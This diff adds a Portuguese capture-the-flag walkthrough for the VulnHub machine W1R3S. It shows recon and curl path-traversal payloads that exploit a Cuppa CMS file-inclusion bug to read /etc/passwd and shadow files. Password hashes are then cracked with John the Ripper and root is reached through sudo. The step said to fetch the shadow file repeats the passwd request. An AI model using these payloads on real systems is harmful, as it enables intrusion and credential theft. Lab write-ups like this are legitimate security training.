@@ -1,0 +1,120 @@
+### RECON
+
+# netdiscover
+192.168.1.109
+
+# nmap 
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.0.8 or later
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+3306/tcp open  mysql   MySQL (unauthorized)
+
+# dirb
+http://192.168.1.109/administrator (Cuppa CMS)
+
+# searchsploit
+Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion | php/webapps/25971.txt
+/usr/share/exploitdb/exploits/php/webapps/25971.txt
+
+# Analise do exploit
+cat 25971.txt
+
+# Copia no paragrado de exemplo, a informação abaixo:
+/cuppa/alerts/alertConfigField.php?urlConfig=php:
+
+# Encontrado o LFI do sistema:
+http://192.168.1.109/administrator/alerts/alertConfigField.php?urlConfig=
+
+# Mas não está respondendo nada no browser:
+http://192.168.1.109/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../../../etc/passwd
+
+# Testado com curl e retornou informações, mas não respondeu em nada.
+curl http://192.168.1.109/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../etc/passwd
+
+# Com curl encontramos o arquivo /etc/passwd e salvamos em um arquivo passwd.
+curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?
+
+# Encontrado o arquivo /etc/shadow e salvamos em um arquivo shadow.
+curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?
+
+# Criado o arquivo de hash dos usuários
+unshadow passwd shadow > hash
+
+# Quebra de senha com o John the Ripper:
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+computer         (w1r3s)
+
+# Usuário w1r3s, tem permissão de executar tudo.
+w1r3s@W1R3S:~$ sudo -l
+sudo: unable to resolve host W1R3S
+[sudo] password for w1r3s: 
+Matching Defaults entries for w1r3s on W1R3S:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User w1r3s may run the following commands on W1R3S:
+    (ALL : ALL) ALL
+
+# Conseguido conectar ao root e capturado a flag:
+w1r3s@W1R3S:~$ sudo su
+sudo: unable to resolve host W1R3S
+root@W1R3S:/home/w1r3s# 
+root@W1R3S:/home/w1r3s# id
+uid=0(root) gid=0(root) groups=0(root)
+root@W1R3S:/home/w1r3s# 
+root@W1R3S:/home/w1r3s# whoami
+root
+root@W1R3S:/home/w1r3s# cd /root
+root@W1R3S:~# ls
+flag.txt
+root@W1R3S:~# cat flag.txt 
+-----------------------------------------------------------------------------------------
+   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  
+  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___| 
+ | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \ 
+ | |__| |_| | |\  | |_| |  _ <  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |
+  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/ 
+                                                                                        
+-----------------------------------------------------------------------------------------
+
+                          .-----------------TTTT_-----_______
+                        /''''''''''(______O] ----------____  \______/]_
+     __...---'"""\_ --''   Q                               ___________@
+ |'''                   ._   _______________=---------"""""""
+ |                ..--''|   l L |_l   |
+ |          ..--''      .  /-___j '   '
+ |    ..--''           /  ,       '   '
+ |--''                /           `    \
+                      L__'         \    -
+                                    -    '-.
+                                     '.    /
+                                       '-./
+
+----------------------------------------------------------------------------------------
+  YOU HAVE COMPLETED THE
+               __      __  ______________________   _________
+              /  \    /  \/_   \______   \_____  \ /   _____/
+              \   \/\/   / |   ||       _/ _(__  < \_____  \ 
+               \        /  |   ||    |   \/       \/        \
+                \__/\  /   |___||____|_  /______  /_______  /.INC
+                     \/                \/       \/        \/        CHALLENGE, V 1.0
+----------------------------------------------------------------------------------------
+
+CREATED BY SpecterWires
+
+----------------------------------------------------------------------------------------
+root@W1R3S:~# 
+
+
+
+Links:
+https://www.vulnhub.com/entry/w1r3s-101,220/
+https://www.youtube.com/watch?v=NDlXcq3yPfg
+https://www.exploit-db.com/exploits/25971
+https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/
+https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/
+
+
+
+
+
